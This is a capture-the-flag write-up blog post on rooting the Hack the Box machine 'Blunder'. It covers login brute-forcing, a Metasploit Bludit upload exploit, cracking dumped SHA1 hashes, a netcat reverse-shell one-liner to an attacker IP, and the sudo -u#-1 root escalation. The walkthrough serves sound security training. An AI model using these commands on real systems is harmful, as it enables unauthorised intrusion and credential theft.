+++
author = "Nick"
categories = ["CTF", "hack the box", "Linux", "easy", "bludit", "blunder", "gobuster", "directory traversal", "metasploit", "sudo", "reverse shell", "su"]
date = 2020-10-17T15:00:00Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2020/10/infocard.png"
slug = "hack-the-box-blunder"
tags = ["CTF", "hack the box", "Linux", "easy", "bludit", "blunder", "gobuster", "directory traversal", "metasploit", "sudo", "reverse shell", "su"]
title = "Hack the Box - Blunder"

+++


Welcome back everyone! Today we are doing the machine Blunder from Hack the Box. This machine is listed as an Easy Linux machine. Let's jump in!

As always, we kick it off with our standard `nmap` command:
`nmap -sC -sV -oA allscan 10.10.10.191`

```
Nmap scan report for 10.10.10.191
Host is up (0.044s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
```

As we see, it's a pretty basic scope. We'll add `blunder.htb` to our hosts file and take a look and see what is being hosted.

We are greeted with a pretty basic site. So as always, we'll start enumerating it with `gobuster`.

Command:
`gobuster dir -u http://blunder.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x txt`

Right away we see `/admin/`, `todo.txt` and `robots.txt`. First we'll take a look at the `todo.txt`. Nothing but some notes and a person to inform. Then we'll head over to `/admin` and see what might be there.

{{< figure src="__GHOST_URL__/content/images/2020/10/image.png" >}}

We get a login page. Some googling shows this is probably a [flat file CMS](https://www.bludit.com/). With this knowledge we can do some research for exploits and vulnerablilies. We find some basic Directory Traversals but they need to be authenticated. More research leads us to a [blog post](https://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb) about brute force detection bypass. Luckily for us, there is a link to the [github](https://github.com/musyoka101/Bludit-CMS-Version-3.9.2-Brute-Force-Protection-Bypass-script/tree/master) for the script as well.

So we'll clone the repo.

Command:
`git clone https://github.com/musyoka101/Bludit-CMS-Version-3.9.2-Brute-Force-Protection-Bypass-script/tree/master`

Now we can change the permissions on the file.

Command:
`chmod +x bruteforce.py`

Now all we have to do is feed it  a `ip`, `username` and a `wordlist`. Now we have a name from our `todo.txt`, Fergus. We have an `ip` and a whole bunch of wordlists. We are good to go!

Command:
`python3 bruteforce.py 10.10.10.191 fergus /usr/share/wordlists/rockyou.txt`

We let it run but don't find anything. We run a few more wordlists and still no dice. Hmmm, well, we have a blog full of text, let's rip it all into a wordlist using `cewl`.

Command:
`cewl -d 1 -m 4 wordlist.lst --with-numbers http://10.10.10.191`

Now with our custom password list, we'll refeed it through our python app and see what we get.

{{< figure src="__GHOST_URL__/content/images/2020/10/blunder_wordlist.gif" >}}

We've got one! A password of `RolandDeschain`. Let's use these creds to log in. Now that we're in, we can look around and get an idea of what's possible. We know we can leverage some previously found Directory Traversals since we have credentials.

Command:
`Searchsploit bludit`

{{< figure src="__GHOST_URL__/content/images/2020/10/image-1.png" >}}

We'll start with the `Metasploit` module. First we'll start up `Metasploit` and find our exploit.

Command:
`msfdb run`

Once inside the `Metasploit` framework, we'll `search` for our exploit.

Command:
`search bludit`

{{< figure src="__GHOST_URL__/content/images/2020/10/image-2.png" >}}

Now we'll `use` that exploit.

Command:
`use 0`
or
`use exploit/linux/http/bludit_upload_images_exec`

Next, we set our `rhost`, `bludituser` and `bluditpass` values.

Command:
`msf5> set rhost 10.10.10.191`
`msf5> set bludituser fergus`
`msf5> set bluditpass RolandDeschain`

Then we'll `run` our exploit.

{{< figure src="__GHOST_URL__/content/images/2020/10/image-3.png" >}}

We now have a `Meterpreter` session! Doing some internal enumation shows two version of bludit installed.

{{< figure src="__GHOST_URL__/content/images/2020/10/image-4.png" >}}

Poking around more shows a `databases` folder which has a `users.php` file. We'll download that file.

Command:
`meterpreter> download users.php`

When we look at the file contents, we see a password file hash for Admin and Fergus.

{{< figure src="__GHOST_URL__/content/images/2020/10/image-5.png" >}}

We'll also download the password from the `bludit-3.10.0a` directory as well. A quick peek on [TunnelsUp](https://www.tunnelsup.com/hash-analyzer/) shows us these are unsalted SHA1 hashes. [Crackstation](https://crackstation.net/) has one of these passwords on file.

{{< figure src="__GHOST_URL__/content/images/2020/10/image-6.png" >}}

This is the password for the user Hugo. Who is also a user on this machine. So at this point, we'll need to create a shell back to our system, upgrade it and switch user to `Hugo`.

We'll enter a shell in `Meterpreter` by issueing the `shell` command. Next we'll start our `netcat` listener.

Command:
`nc -lvnp 6969`

Next we'll forward out our shell. In this box we don't have the `-e` option in `netcat`. We can use [this solution](https://medium.com/@shadowslayerqwerty/creating-a-netcat-reverse-shell-without-e-89b45134de99). Also, you could upload a webshell via `meterpreter` as well.

Command:
`mknod /tmp/backpipe p /bin/sh 0</tmp/backpipe | nc 10.10.14.202 6969 1>/tmp/backpipe`

And we catch a shell.

{{< figure src="__GHOST_URL__/content/images/2020/10/image-7.png" >}}

Now we can upgrade out shell.

Command:
`python3 -c 'import pty;pty.spawn("/bin/bash")'`

Now we can `su` to hugo and get our `users.txt` flag!

{{< figure src="__GHOST_URL__/content/images/2020/10/image-8.png" >}}

Now that we have a foothold as a user, we can enumerate. This box has been quite different than boxes in the past. Normally, we'd do basic enumeration by hand by poking around, running some basic commands and then use `linenum` or another enum script. This time, every tidbit we need has been in our initial commands.

We run `sudo -l` and see the `!root` flag.

{{< figure src="__GHOST_URL__/content/images/2020/10/image-9.png" >}}

Between this and the version of `sudo` running, we can escalate to root. Here's a [quick snip](https://www.exploit-db.com/exploits/47502) on how the exploit works. All we have to do is execute the following command:

`sudo -u#-1 /bin/bash`

{{< figure src="__GHOST_URL__/content/images/2020/10/blunder_root.gif" >}}

There we have it, box complete. A pretty standard entry level CTF box. I would highly recommend this box to new users.

If you enjoyed this write-up and / or learned something along the way, shoot some me some respect on [Hack The Box](https://www.hackthebox.eu/home/users/profile/95635).





